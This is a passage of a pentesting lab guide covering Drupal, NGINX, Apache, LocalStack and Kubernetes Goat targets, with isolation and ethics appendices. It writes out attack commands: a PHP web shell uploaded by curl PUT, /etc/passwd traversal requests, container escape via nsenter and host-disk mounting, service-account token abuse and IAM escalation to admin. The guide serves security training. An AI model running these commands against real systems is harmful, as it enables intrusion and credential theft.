### Database Connection Details

- **Database Host**: drupaldb
- **Database Name**: drupal
- **Database User**: drupal
- **Database Password**: drupal
- **Database Type**: PostgreSQL 15

### Common Drupal Vulnerabilities to Test

#### 1. Drupalgeddon Vulnerabilities

While this is Drupal 9, understanding historical vulnerabilities is educational:

- **Drupalgeddon 1 (CVE-2014-3704)**: SQL injection
- **Drupalgeddon 2 (CVE-2018-7600)**: Remote code execution
- **Drupalgeddon 3 (CVE-2018-7602)**: Remote code execution

#### 2. User Enumeration

```bash
# Via user profiles
http://x.x.x.x:8083/user/1
http://x.x.x.x:8083/user/2

# Via REST API
http://x.x.x.x:8083/user?_format=json

# Via login error messages
```

#### 3. REST API Testing

```bash
# Enumerate nodes
curl http://x.x.x.x:8083/node?_format=json

# Enumerate users (if enabled)
curl http://x.x.x.x:8083/user?_format=json

# Test for unauthorized access
curl http://x.x.x.x:8083/jsonapi
```

#### 4. Module Vulnerabilities

- Outdated contrib modules
- Custom module flaws
- Module permission bypass
- Update status disclosure

#### 5. File Upload Vulnerabilities

- Test allowed file extensions
- MIME type validation
- File path manipulation
- Execute uploaded files

#### 6. SQL Injection

- Database API misuse
- Custom module queries
- Search functionality
- Form inputs

### Drupal-Specific Reconnaissance

#### Version Detection

```bash
# Check CHANGELOG.txt
http://x.x.x.x:8083/CHANGELOG.txt

# Check generator meta tag
curl http://x.x.x.x:8083 | grep generator

# Use droopescan
droopescan scan drupal -u http://x.x.x.x:8083
```

#### Module Enumeration

```bash
# Manual checks
http://x.x.x.x:8083/modules/
http://x.x.x.x:8083/sites/all/modules/

# Droopescan
droopescan scan drupal -u http://x.x.x.x:8083 -e p

# Check status page (if accessible)
http://x.x.x.x:8083/admin/reports/status
```

#### Configuration Files

```bash
# Settings file (should be protected)
http://x.x.x.x:8083/sites/default/settings.php

# Services configuration
http://x.x.x.x:8083/sites/default/services.yml
```

### Recommended Tools

#### Droopescan

```bash
# Basic scan
droopescan scan drupal -u http://x.x.x.x:8083

# Plugin enumeration
droopescan scan drupal -u http://x.x.x.x:8083 -e p

# Theme enumeration
droopescan scan drupal -u http://x.x.x.x:8083 -e t
```

#### Other Tools

- **Burp Suite**: Manual testing
- **Metasploit**: Drupal exploit modules
- **CMSmap**: CMS vulnerability scanner
- **sqlmap**: SQL injection
- **drupwn**: Drupal enumeration and exploitation

### Getting Started

1. **Access Site**: http://x.x.x.x:8083
2. **Complete Installation**: Follow Drupal installation wizard
3. **Configure Database**: Use PostgreSQL credentials above
4. **Create Admin Account**: Set up site administrator
5. **Run Droopescan**: Perform initial reconnaissance
6. **Explore Admin Panel**: Navigate /admin sections

### Testing Workflow

```
1. Reconnaissance
   - Version detection
   - Module enumeration
   - User enumeration
   - Configuration file discovery

2. Vulnerability Assessment
   - Check for known CVEs
   - Test module vulnerabilities
   - API security testing
   - Permission model testing

3. Exploitation
   - Exploit identified vulnerabilities
   - Brute force authentication
   - Upload web shells
   - SQL injection

4. Post-Exploitation
   - Database access
   - Configuration extraction
   - Privilege escalation
```

### Drupal REST API Testing

```bash
# JSON API (if enabled)
curl http://x.x.x.x:8083/jsonapi

# Core REST endpoints
curl http://x.x.x.x:8083/node?_format=json
curl http://x.x.x.x:8083/user?_format=json

# Test POST/PATCH/DELETE without authentication
curl -X POST http://x.x.x.x:8083/node?_format=json \
  -H "Content-Type: application/json" \
  -d '{"type":"article","title":"Test"}'
```

### Practice Scenarios

1. **Anonymous to Admin**: Complete privilege escalation
2. **Module Exploitation**: Find and exploit vulnerable modules
3. **Database Compromise**: Extract Drupal database
4. **API Abuse**: Exploit REST API vulnerabilities
5. **Configuration Extraction**: Retrieve sensitive configuration

### Security Testing Checklist

- [ ] Drupal version identification
- [ ] User enumeration
- [ ] Module enumeration
- [ ] Outdated modules
- [ ] Known CVE applicability
- [ ] REST API exposure
- [ ] File upload validation
- [ ] SQL injection in modules
- [ ] Configuration file exposure
- [ ] Update status disclosure
- [ ] Weak admin credentials
- [ ] Permission bypass vulnerabilities

### Drupal vs WordPress

Key differences for pentesting:

| Aspect | Drupal | WordPress |
|--------|---------|-----------|
| **Database** | PostgreSQL/MySQL | MySQL |
| **Extensions** | Modules | Plugins |
| **API** | REST/JSON API | REST API/XML-RPC |
| **User Enum** | /user/N | /?author=N |
| **Config** | settings.php | wp-config.php |
| **Scanner** | droopescan | wpscan |

### References

- [Drupal Official Site](https://www.drupal.org/)
- [Drupal Security Team](https://www.drupal.org/security)
- [Droopescan GitHub](https://github.com/droope/droopescan)

---

## Chapter 8: NGINX Static Server

**Access:** http://x.x.x.x:8085
**Technology:** NGINX Alpine
**Difficulty:** Beginner

### Overview

A basic NGINX web server serving static content. This server is useful for testing web server misconfigurations, file upload vulnerabilities, directory traversal, and as a target for file upload testing from other vulnerable applications.

### Key Features

- **Lightweight**: Alpine Linux-based NGINX
- **Static File Serving**: Simple HTML/file hosting
- **Upload Testing Target**: Practice file upload attacks
- **Configuration Testing**: NGINX-specific vulnerabilities

### Default Content

The server serves files from `/opt/vulnlab/nginx-static/` directory:
- Default index.html contains: "OK (nginx static)"

### Common Testing Scenarios

#### 1. Directory Traversal

```bash
# Test path traversal
http://x.x.x.x:8085/../../../etc/passwd
http://x.x.x.x:8085/....//....//etc/passwd

# URL encoding
http://x.x.x.x:8085/%2e%2e/%2e%2e/etc/passwd

# Test with various payloads
```

#### 2. Directory Listing

```bash
# Check if directory listing enabled
http://x.x.x.x:8085/

# Try to list subdirectories
http://x.x.x.x:8085/uploads/
http://x.x.x.x:8085/files/
```

#### 3. Sensitive File Access

```bash
# Try to access common files
http://x.x.x.x:8085/.git/
http://x.x.x.x:8085/.env
http://x.x.x.x:8085/config.php
http://x.x.x.x:8085/.htaccess
http://x.x.x.x:8085/nginx.conf
```

#### 4. HTTP Method Testing

```bash
# Test allowed HTTP methods
curl -X OPTIONS http://x.x.x.x:8085 -v

# Test PUT method (file upload)
curl -X PUT http://x.x.x.x:8085/test.txt \
  -d "test content"

# Test DELETE method
curl -X DELETE http://x.x.x.x:8085/index.html
```

#### 5. File Upload Testing

If you gain write access through other vulnerabilities:

```bash
# Upload web shell
curl -X PUT http://x.x.x.x:8085/shell.php \
  -d "<?php system(\$_GET['cmd']); ?>"

# Upload HTML file
curl -X PUT http://x.x.x.x:8085/test.html \
  -d "<html><body>Test</body></html>"
```

### Adding Custom Content

From the server host:

```bash
# Add files to static directory
echo "Custom content" > /opt/vulnlab/nginx-static/test.txt

# Access via browser
http://x.x.x.x:8085/test.txt
```

### Use as Upload Target

This server can be used as a target for:

1. **SSRF Attacks**: From other vulnerable apps, make requests to this server
2. **File Upload**: Upload files from other applications
3. **XSS Hosting**: Host XSS payloads
4. **Exfiltration**: Receive exfiltrated data

Example SSRF test:
```bash
# From another vulnerable app, try to access
http://x.x.x.x:8085/internal-file.txt
```

### Recommended Tools

- **curl**: Command-line testing
- **Burp Suite**: HTTP method tampering
- **nikto**: Web server scanning
- **dirb/gobuster**: Directory enumeration
- **davtest**: WebDAV testing (if enabled)

### Practice Scenarios

1. **Configuration Audit**: Identify NGINX misconfigurations
2. **File Upload Chain**: Upload from one app, access from NGINX
3. **SSRF Target**: Use as destination for SSRF attacks
4. **Method Tampering**: Test PUT/DELETE/OPTIONS
5. **Path Traversal**: Find accessible files outside webroot

### Security Testing Checklist

- [ ] Directory listing enabled
- [ ] Dangerous HTTP methods allowed (PUT, DELETE)
- [ ] Path traversal vulnerabilities
- [ ] Sensitive file exposure (.git, .env, etc.)
- [ ] MIME type handling
- [ ] Request size limits
- [ ] Rate limiting
- [ ] SSL/TLS configuration (if HTTPS)
- [ ] Security headers present

### References

- [NGINX Official Documentation](https://nginx.org/en/docs/)
- [NGINX Security Controls](https://docs.nginx.com/nginx/admin-guide/security-controls/)

---

## Chapter 9: Apache Static Server

**Access:** http://x.x.x.x:8086
**Technology:** Apache httpd 2.4
**Difficulty:** Beginner

### Overview

A basic Apache HTTP Server serving static content. This server is useful for testing Apache-specific misconfigurations, .htaccess security, and comparing behavior with NGINX.

### Key Features

- **Apache httpd 2.4**: Industry-standard web server
- **Static File Serving**: Basic HTML/file hosting
- **.htaccess Testing**: Directory-level configuration
- **Apache-Specific Vulnerabilities**: Module-based architecture

### Default Content

The server serves files from `/opt/vulnlab/apache-static/` directory:
- Default index.html contains: "OK (apache static)"

### Common Testing Scenarios

#### 1. .htaccess Files

```bash
# Try to access .htaccess
http://x.x.x.x:8086/.htaccess

# Create .htaccess for testing
# (requires write access - practice from other vulnerabilities)
```

Example .htaccess for testing:

```apache
# Directory listing
Options +Indexes

# Allow PUT/DELETE methods
<Limit PUT DELETE>
    Allow from all
</Limit>

# PHP execution in specific directory
AddHandler application/x-httpd-php .html
```

#### 2. Directory Traversal

```bash
# Test path traversal
http://x.x.x.x:8086/../../../etc/passwd
http://x.x.x.x:8086/....//....//etc/passwd

# Double encoding
http://x.x.x.x:8086/%252e%252e/etc/passwd
```

#### 3. HTTP Method Testing

```bash
# Check allowed methods
curl -X OPTIONS http://x.x.x.x:8086 -v

# Test TRACE method (Cross-Site Tracing)
curl -X TRACE http://x.x.x.x:8086 -v

# Test PUT
curl -X PUT http://x.x.x.x:8086/test.txt \
  -d "test content"

# Test DELETE
curl -X DELETE http://x.x.x.x:8086/test.txt
```

#### 4. Apache Module Testing

```bash
# Check server header for module info
curl -I http://x.x.x.x:8086

# Test for mod_status
http://x.x.x.x:8086/server-status

# Test for mod_info
http://x.x.x.x:8086/server-info

# Test for mod_rewrite
# Various URL patterns
```

#### 5. Sensitive File Access

```bash
# Apache-specific files
http://x.x.x.x:8086/.htaccess
http://x.x.x.x:8086/.htpasswd
http://x.x.x.x:8086/httpd.conf

# Common hidden files
http://x.x.x.x:8086/.git/
http://x.x.x.x:8086/.svn/
http://x.x.x.x:8086/.env
```

#### 6. Directory Listing

```bash
# Check if autoindex enabled
http://x.x.x.x:8086/

# Try various directories
http://x.x.x.x:8086/uploads/
http://x.x.x.x:8086/files/
http://x.x.x.x:8086/backup/
```

### Apache vs NGINX Comparison

Test same vulnerabilities on both servers to understand differences:

| Feature | Apache (8086) | NGINX (8085) |
|---------|---------------|--------------|
| **.htaccess** | Supported | Not supported |
| **TRACE method** | Often enabled | Usually disabled |
| **mod_status** | Apache-specific | Different in NGINX |
| **Configuration** | Distributed (.htaccess) | Centralized |

### Adding Custom Content

From the server host:

```bash
# Add files to static directory
echo "Custom content" > /opt/vulnlab/apache-static/test.txt

# Create .htaccess for testing
cat > /opt/vulnlab/apache-static/.htaccess <<EOF
Options +Indexes
EOF

# Access via browser
http://x.x.x.x:8086/test.txt
```

### Recommended Tools

- **curl**: Command-line testing
- **Burp Suite**: HTTP manipulation
- **nikto**: Apache scanning
- **dirb/gobuster**: Directory enumeration
- **davtest**: WebDAV testing

### Practice Scenarios

1. **Configuration Comparison**: Compare Apache vs NGINX security
2. **.htaccess Abuse**: Create malicious .htaccess files
3. **Module Exploitation**: Test vulnerable Apache modules
4. **Method Tampering**: HTTP method security
5. **Information Disclosure**: Extract server information

### Security Testing Checklist

- [ ] Server version disclosure
- [ ] Directory listing enabled
- [ ] .htaccess accessible
- [ ] .htpasswd exposure
- [ ] TRACE method enabled (XST)
- [ ] PUT/DELETE methods allowed
- [ ] mod_status accessible
- [ ] mod_info accessible
- [ ] Path traversal vulnerabilities
- [ ] Sensitive file exposure
- [ ] Security headers missing
- [ ] Outdated Apache version

### Common Apache Vulnerabilities

#### CVEs to Research

- **CVE-2021-41773**: Path traversal and RCE (Apache 2.4.49)
- **CVE-2021-42013**: Path traversal and RCE (Apache 2.4.50)
- **Slowloris**: Denial of service attack

While the current version may not be vulnerable, understanding these helps with:
- Version detection importance
- Attack methodology
- Mitigation strategies

### References

- [Apache HTTP Server Documentation](https://httpd.apache.org/docs/2.4/)
- [Apache Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)
- [OWASP Apache Security](https://cheatsheetseries.owasp.org/cheatsheets/Apache_Security_Cheat_Sheet.html)

---

## Chapter 10: LocalStack (AWS Emulator)

**Access:** http://x.x.x.x:4566
**Technology:** Python, Docker
**Difficulty:** Intermediate to Advanced

### Overview

LocalStack is a fully functional local AWS cloud stack that emulates AWS services. It allows testing of cloud security vulnerabilities, AWS API exploitation, and cloud pentesting techniques without touching actual AWS infrastructure or incurring costs.

### Key Features

- **100+ AWS Services Emulated**: S3, Lambda, DynamoDB, IAM, and more
- **API Compatible**: Uses same API as real AWS
- **No Cloud Costs**: Test freely without AWS charges
- **Serverless Testing**: Test Lambda functions locally
- **IaC Testing**: Test Terraform, CloudFormation, AWS CDK

### Emulated Services

The installation includes:

- **S3**: Object storage
- **IAM**: Identity and Access Management
- **Lambda**: Serverless functions
- **API Gateway**: API management
- **STS**: Security Token Service

Additional services can be enabled as needed.

### Getting Started

#### 1. Install AWS CLI

```bash
# If not already installed
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
```

#### 2. Configure AWS CLI for LocalStack

```bash
# Configure AWS CLI (use fake credentials)
aws configure
# AWS Access Key ID: test
# AWS Secret Access Key: test
# Default region: us-east-1
# Default output format: json
```

#### 3. Set LocalStack Endpoint

```bash
# Use --endpoint-url with each command
aws --endpoint-url=http://x.x.x.x:4566 s3 ls

# Or export as environment variable
export AWS_ENDPOINT_URL=http://x.x.x.x:4566
```

### Common Testing Scenarios

#### 1. S3 Bucket Enumeration

```bash
# List buckets
aws --endpoint-url=http://x.x.x.x:4566 s3 ls

# Create bucket
aws --endpoint-url=http://x.x.x.x:4566 s3 mb s3://test-bucket

# Upload file
echo "sensitive data" > secret.txt
aws --endpoint-url=http://x.x.x.x:4566 s3 cp secret.txt s3://test-bucket/

# Download file
aws --endpoint-url=http://x.x.x.x:4566 s3 cp s3://test-bucket/secret.txt ./

# Check bucket permissions
aws --endpoint-url=http://x.x.x.x:4566 s3api get-bucket-acl --bucket test-bucket
```

#### 2. S3 Bucket Misconfiguration

```bash
# Make bucket public (misconfiguration)
aws --endpoint-url=http://x.x.x.x:4566 s3api put-bucket-acl \
  --bucket test-bucket \
  --acl public-read

# Test public access
curl http://x.x.x.x:4566/test-bucket/secret.txt

# List public buckets
aws --endpoint-url=http://x.x.x.x:4566 s3 ls
```

#### 3. IAM Exploitation

```bash
# List IAM users
aws --endpoint-url=http://x.x.x.x:4566 iam list-users

# Create IAM user
aws --endpoint-url=http://x.x.x.x:4566 iam create-user \
  --user-name testuser

# Create access key
aws --endpoint-url=http://x.x.x.x:4566 iam create-access-key \
  --user-name testuser

# Attach admin policy (privilege escalation)
aws --endpoint-url=http://x.x.x.x:4566 iam attach-user-policy \
  --user-name testuser \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# List policies
aws --endpoint-url=http://x.x.x.x:4566 iam list-policies
```

#### 4. Lambda Function Testing

```bash
# Create Lambda function
cat > index.js <<EOF
exports.handler = async (event) => {
    return {
        statusCode: 200,
        body: JSON.stringify('Hello from Lambda!'),
    };
};
EOF

zip function.zip index.js

aws --endpoint-url=http://x.x.x.x:4566 lambda create-function \
  --function-name testfunction \
  --runtime nodejs18.x \
  --role arn:aws:iam::000000000000:role/lambda-role \
  --handler index.handler \
  --zip-file fileb://function.zip

# Invoke function
aws --endpoint-url=http://x.x.x.x:4566 lambda invoke \
  --function-name testfunction \
  response.json

# List functions
aws --endpoint-url=http://x.x.x.x:4566 lambda list-functions
```

#### 5. API Gateway

```bash
# Create REST API
aws --endpoint-url=http://x.x.x.x:4566 apigateway create-rest-api \
  --name 'Test API'

# List APIs
aws --endpoint-url=http://x.x.x.x:4566 apigateway get-rest-apis
```

#### 6. STS Token Testing

```bash
# Assume role
aws --endpoint-url=http://x.x.x.x:4566 sts assume-role \
  --role-arn arn:aws:iam::000000000000:role/test-role \
  --role-session-name test-session

# Get caller identity
aws --endpoint-url=http://x.x.x.x:4566 sts get-caller-identity
```

### Cloud Security Testing Scenarios

#### 1. S3 Data Exfiltration

Scenario: Attacker finds exposed S3 bucket and exfiltrates data

```bash
# Enumerate buckets
# Find publicly accessible bucket
# Download all contents recursively
aws --endpoint-url=http://x.x.x.x:4566 s3 sync s3://target-bucket ./exfil/
```

#### 2. IAM Privilege Escalation

Scenario: Low-privilege user escalates to admin

```bash
# List current permissions
# Find policy attachment permission
# Attach AdministratorAccess policy to self
# Verify new permissions
```

#### 3. Lambda Backdoor

Scenario: Attacker deploys malicious Lambda function

```bash
# Create reverse shell Lambda
# Exfiltrate environment variables
# Persist access
```

#### 4. Serverless Injection

Scenario: Command injection in Lambda function

```bash
# Deploy vulnerable Lambda
# Inject malicious commands
# Achieve code execution
```

### Recommended Tools

#### Cloud Security Tools

```bash
# Scout Suite (AWS security auditing)
git clone https://github.com/nccgroup/ScoutSuite
cd ScoutSuite
pip install -r requirements.txt

python scout.py aws --endpoint-url http://x.x.x.x:4566

# Pacu (AWS exploitation framework)
git clone https://github.com/RhinoSecurityLabs/pacu
cd pacu
pip install -r requirements.txt

# CloudMapper (AWS visualization)
# Prowler (AWS security assessment)
# WeirdAAL (AWS attack library)
```

#### Standard Tools

- **AWS CLI**: Primary interaction tool
- **Boto3**: Python AWS SDK for custom scripts
- **Burp Suite**: Intercept AWS API calls
- **curl**: Direct API testing

### Testing Workflow

```
1. Reconnaissance
   - Enumerate services
   - List resources (buckets, users, roles, functions)
   - Identify permissions

2. Vulnerability Assessment
   - Check bucket ACLs
   - Review IAM policies
   - Test for public access
   - Identify overly permissive roles

3. Exploitation
   - Access misconfigured resources
   - Escalate privileges
   - Deploy malicious resources
   - Exfiltrate data

4. Post-Exploitation
   - Establish persistence
   - Lateral movement
   - Deploy backdoors
```

### Practice Scenarios

1. **AWS Pentesting Basics**: Learn AWS service enumeration
2. **S3 Bucket Exploitation**: Find and exploit misconfigurations
3. **IAM Privilege Escalation**: Multiple privilege escalation paths
4. **Lambda Security**: Serverless vulnerabilities
5. **Infrastructure as Code**: Test Terraform/CloudFormation security

### Security Testing Checklist

- [ ] Enumerate all available services
- [ ] List S3 buckets and check ACLs
- [ ] Test for public S3 buckets
- [ ] Enumerate IAM users and roles
- [ ] Check for overly permissive IAM policies
- [ ] Test IAM privilege escalation paths
- [ ] List Lambda functions
- [ ] Test Lambda function permissions
- [ ] Check API Gateway configurations
- [ ] Test STS token generation
- [ ] Identify exposed credentials
- [ ] Test resource-based policies

### AWS Security Best Practices to Violate (for learning)

This is a learning environment, so intentionally:

1. **Make S3 buckets public**
2. **Create overly permissive IAM policies**
3. **Use hardcoded credentials**
4. **Disable encryption**
5. **Remove MFA requirements**
6. **Allow public Lambda function URLs**
7. **Expose sensitive data in environment variables**

Then practice finding and exploiting these misconfigurations.

### References

- [LocalStack Documentation](https://docs.localstack.cloud/)
- [AWS CLI Reference](https://docs.aws.amazon.com/cli/latest/)
- [LocalStack GitHub](https://github.com/localstack/localstack)
- [AWS Security Best Practices](https://aws.amazon.com/blogs/compute/enhance-the-local-testing-experience-for-serverless-applications-with-localstack/)

---

## Chapter 11: Kubernetes Goat

**Access Method:** Port-forwarding (Browser-based)
**Default URL:** http://x.x.x.x:1234 (after port-forward)
**Technology:** Kubernetes, Docker (kind)
**Difficulty:** Intermediate to Advanced

### Overview

Kubernetes Goat is a "Vulnerable by Design" Kubernetes cluster environment designed to teach Kubernetes security through hands-on practice. Unlike traditional web applications, Kubernetes Goat focuses on container and orchestration security in cloud-native environments.

### Key Features

- **20+ Scenarios**: Real-world Kubernetes vulnerabilities
- **Modern Cloud-Native**: Container and Kubernetes security
- **Interactive Learning**: Browser-based access to scenarios
- **Production-Like**: Realistic microservices architecture
- **Multi-Layer Security**: Network, pod, RBAC, secrets, and more

### Architecture

Kubernetes Goat runs as a kind (Kubernetes in Docker) cluster with multiple vulnerable deployments, services, and configurations spread across different namespaces.

### Connection Methods

#### Method 1: Local Port-Forward (Default)

This method exposes Kubernetes Goat on localhost only:

```bash
# Navigate to Kubernetes Goat directory
cd /opt/vulnlab/kubernetes-goat

# Run access script
bash access-kubernetes-goat.sh

# Access in browser
# http://127.0.0.1:1234
```

#### Method 2: LAN-Accessible Port-Forward (Recommended for Pentesting)

This method makes Kubernetes Goat accessible from any machine on the LAN:

```bash
# Port-forward with --address 0.0.0.0
kubectl port-forward --address 0.0.0.0 \
  -n kubernetes-goat \
  svc/kubernetes-goat-home 1234:1234

# Access from LAN
# http://x.x.x.x:1234
```

**Note**: You need to keep this terminal session open for the port-forward to remain active.

### Accessing the Dashboard

1. **Start Port-Forward**: Use Method 2 above for LAN access
2. **Open Browser**: Navigate to http://x.x.x.x:1234
3. **View Scenarios**: The dashboard lists all available scenarios
4. **Select Scenario**: Click on any scenario to start

### Required Tools for Kubernetes Pentesting

Already installed by the setup script:

- **kubectl**: Kubernetes command-line tool
- **kind**: Kubernetes in Docker
- **helm**: Kubernetes package manager
- **docker**: Container runtime

Additional recommended tools:

```bash
# kubeletctl (Kubelet exploitation)
wget https://github.com/cyberark/kubeletctl/releases/download/v1.9/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
sudo mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl

# kube-hunter (Kubernetes security scanner)
pip3 install kube-hunter

# kube-bench (CIS Kubernetes benchmark)
wget https://github.com/aquasecurity/kube-bench/releases/download/v0.7.0/kube-bench_0.7.0_linux_amd64.deb
sudo dpkg -i kube-bench_0.7.0_linux_amd64.deb

# trivy (Container vulnerability scanner)
sudo apt-get install wget apt-transport-https gnupg lsb-release
wget -qO - https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
echo "deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main" | sudo tee -a /etc/apt/sources.list.d/trivy.list
sudo apt-get update
sudo apt-get install trivy
```

### Kubernetes Goat Scenarios

#### Scenario 1: Sensitive Keys in Codebases

- **Difficulty**: Easy
- **Objective**: Find hardcoded secrets in container images
- **Skills**: Image analysis, secrets extraction

```bash
# List pods
kubectl get pods -n default

# Get pod details
kubectl describe pod <pod-name>

# Execute into container
kubectl exec -it <pod-name> -- /bin/bash

# Search for secrets
grep -r "password" /app/
```

#### Scenario 2: DIND (Docker in Docker) Exploitation

- **Difficulty**: Medium
- **Objective**: Escape container using Docker socket
- **Skills**: Container escape, privilege escalation

#### Scenario 3: SSRF in Kubernetes

- **Difficulty**: Medium
- **Objective**: Exploit SSRF to access Kubernetes API
- **Skills**: SSRF, Kubernetes API abuse

```bash
# Access metadata service
curl http://metadata.google.internal/computeMetadata/v1/

# Access Kubernetes API
curl https://kubernetes.default/api/v1/namespaces
```

#### Scenario 4: Container Escape to Host System

- **Difficulty**: Hard
- **Objective**: Break out of container to host
- **Skills**: Container escape techniques

#### Scenario 5: Docker CIS Benchmarks

- **Difficulty**: Easy
- **Objective**: Identify CIS benchmark violations
- **Skills**: Security auditing, compliance

#### Scenario 6: Kubernetes Goat Home DoS

- **Difficulty**: Easy
- **Objective**: Denial of service attack
- **Skills**: Resource exhaustion

#### Scenario 7: Hidden in Layers

- **Difficulty**: Medium
- **Objective**: Find secrets in Docker image layers
- **Skills**: Image forensics

```bash
# Save image
docker save <image> -o image.tar

# Extract and analyze layers
tar -xf image.tar
find . -name "*.tar" -exec tar -xf {} \;
grep -r "password" .
```

#### Scenario 8: RBAC Least Privileges Misconception

- **Difficulty**: Medium
- **Objective**: Exploit overly permissive RBAC
- **Skills**: RBAC analysis, privilege escalation

```bash
# Check current permissions
kubectl auth can-i --list

# Test specific actions
kubectl auth can-i create pods
kubectl auth can-i get secrets
```

#### Scenario 9: Attacking Private Container Registry

- **Difficulty**: Hard
- **Objective**: Access private registry
- **Skills**: Registry security, credential extraction

#### Scenario 10: Kubernetes Namespaces Bypass

- **Difficulty**: Medium
- **Objective**: Access resources in other namespaces
- **Skills**: Namespace isolation testing

```bash
# List namespaces
kubectl get namespaces

# Try to access resources in other namespaces
kubectl get pods -n kube-system
kubectl get secrets -n default
```

Additional scenarios cover:
- Helm chart vulnerabilities
- Sidecar container exploitation
- Kubernetes secrets exposure
- Network policy bypass
- Pod security policy weaknesses
- Service account token abuse

### Kubernetes Reconnaissance

#### Cluster Information

```bash
# Get cluster info
kubectl cluster-info

# Get nodes
kubectl get nodes

# Get all resources across all namespaces
kubectl get all -A

# Get namespaces
kubectl get namespaces

# Get pods in all namespaces
kubectl get pods -A
```

#### Kubernetes Goat Specific

```bash
# Get Kubernetes Goat pods
kubectl get pods -n kubernetes-goat

# Get services
kubectl get svc -n kubernetes-goat

# Get deployments
kubectl get deployments -A

# Get secrets (if permitted)
kubectl get secrets -A
```

### Common Kubernetes Pentesting Techniques

#### 1. Service Account Token Exploitation

Every pod has a service account token mounted:

```bash
# Exec into pod
kubectl exec -it <pod-name> -- /bin/bash

# Token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Use token to access API
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default/api/v1/namespaces
```

#### 2. Privilege Escalation via RBAC

```bash
# Check what you can do
kubectl auth can-i --list

# If you can create pods in default namespace
kubectl run privileged-pod --image=alpine --restart=Never \
  --overrides='{"spec":{"hostNetwork":true,"hostPID":true}}' \
  -- /bin/sh -c "nsenter --mount=/proc/1/ns/mnt -- bash"
```

#### 3. Container Escape

```bash
# Check if running as privileged
cat /proc/self/status | grep CapEff

# Mount host filesystem
mkdir /host
mount /dev/sda1 /host
chroot /host
```

#### 4. Network Scanning

```bash
# Scan internal services
nmap -sV 10.0.0.0/24

# Scan Kubernetes API
nmap -p 6443,8080,10250,10255 <node-ip>
```

### Testing Workflow

```
1. Reconnaissance
   - Map cluster architecture
   - Identify namespaces and resources
   - Enumerate service accounts
   - Check RBAC permissions

2. Initial Access
   - Exploit vulnerable web applications
   - SSRF to metadata service
   - Access exposed dashboards

3. Privilege Escalation
   - Abuse service account tokens
   - Exploit RBAC misconfigurations
   - Container escape techniques

4. Lateral Movement
   - Access other namespaces
   - Compromise other pods
   - Access secrets and config maps

5. Persistence
   - Create rogue service accounts
   - Deploy backdoor containers
   - Modify existing deployments
```

### Practice Scenarios

1. **Beginner Path**: Complete scenarios 1, 5, 6 (secrets, benchmarks, DoS)
2. **Intermediate Path**: Scenarios 3, 8, 10 (SSRF, RBAC, namespaces)
3. **Advanced Path**: Scenarios 2, 4, 9 (DIND, escape, registry)
4. **Full Compromise**: Chain multiple vulnerabilities for cluster takeover

### Security Testing Checklist

- [ ] Enumerate all pods and services
- [ ] Check service account permissions
- [ ] Test RBAC configurations
- [ ] Look for hardcoded secrets
- [ ] Test container escape possibilities
- [ ] Check network policies
- [ ] Test namespace isolation
- [ ] Examine pod security policies
- [ ] Check for exposed dashboards
- [ ] Test kubelet API access (port 10250)
- [ ] Review Helm chart security
- [ ] Scan container images for vulnerabilities

### Kubernetes vs Traditional Web Apps

Key differences:

| Aspect | Traditional Web | Kubernetes |
|--------|-----------------|------------|
| **Access** | Direct HTTP | Port-forward or Ingress |
| **Scope** | Single application | Entire cluster |
| **Privilege Escalation** | OS-level | Container â Node â Cluster |
| **Persistence** | File system | Deployments, DaemonSets |
| **Lateral Movement** | Network-based | Pod-to-pod, namespace-to-namespace |

### Important Commands Reference

```bash
# View Kubernetes Goat scenarios
kubectl get pods -n kubernetes-goat

# Access pod shell
kubectl exec -it <pod-name> -n <namespace> -- /bin/bash

# View logs
kubectl logs <pod-name> -n <namespace>

# Port forward service
kubectl port-forward -n <namespace> svc/<service-name> <local-port>:<service-port>

# Get secrets
kubectl get secrets -n <namespace>
kubectl get secret <secret-name> -n <namespace> -o yaml

# Describe resource
kubectl describe pod <pod-name> -n <namespace>

# Run security scanners
kube-hunter --remote http://x.x.x.x:1234
kube-bench run --targets=node,master
```

### References

- [Kubernetes Goat Documentation](https://madhuakula.com/kubernetes-goat/docs/)
- [GitHub Repository](https://github.com/madhuakula/kubernetes-goat)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [Hands-on Tutorial](https://kloudle.com/academy/hands-on-with-kubernetes-goat-introduction-and-setup/)

---

# Appendix A: Security Considerations

## Isolation Requirements

**CRITICAL**: This lab contains intentionally vulnerable applications and MUST be isolated from production networks and the internet.

### Network Isolation Methods

1. **Physical Isolation**: Dedicated network segment with no internet access
2. **VLAN Segregation**: Separate VLAN from corporate/home network
3. **Virtual Network**: Isolated virtual network in hypervisor
4. **Air-Gapped**: Completely disconnected from other networks

### Firewall Rules

If using a firewall between lab and other networks:

```bash
# Block all outbound internet access
iptables -A OUTPUT -j DROP

# Allow only local network
iptables -A OUTPUT -d 192.168.68.0/24 -j ACCEPT

# Block inbound from internet
iptables -A INPUT -s 0.0.0.0/0 -j DROP
```

### Monitoring

Consider monitoring lab traffic for learning:

```bash
# Capture traffic
tcpdump -i <interface> -w capture.pcap

# Monitor specific port
tcpdump -i <interface> port 8080 -w webgoat.pcap
```

## Legal and Ethical Considerations

- **Only test systems you own or have explicit permission to test**
- **Never expose these services to the internet**
- **Do not use learned techniques on unauthorized systems**
- **Comply with all applicable laws and regulations**
- **Use for educational and authorized testing purposes only**

## Data Protection

- **Do not use real credentials**: Always use test data
- **Do not store sensitive information**: Even in test environments
- **Regular resets**: Reset environments between testing sessions
- **Secure your pentesting machine**: Your attacking machine should also be secure

---

# Appendix B: Additional Resources

## Official Project Pages

- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Mutillidae II](https://owasp.org/www-project-mutillidae-ii/)
- [OWASP crAPI](https://owasp.org/www-project-crapi/)
- [Kubernetes Goat](https://madhuakula.com/kubernetes-goat/)
